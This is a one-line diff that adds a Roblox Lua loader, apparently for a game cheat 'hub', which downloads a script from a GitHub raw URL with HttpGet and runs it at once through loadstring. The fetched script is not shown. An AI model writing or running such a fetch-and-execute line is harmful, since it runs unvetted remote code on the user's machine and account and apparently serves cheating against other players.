@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/milkywiffle-netizen/Katchi-hub/refs/heads/main/Keysy1%2Bskillpoint"))()
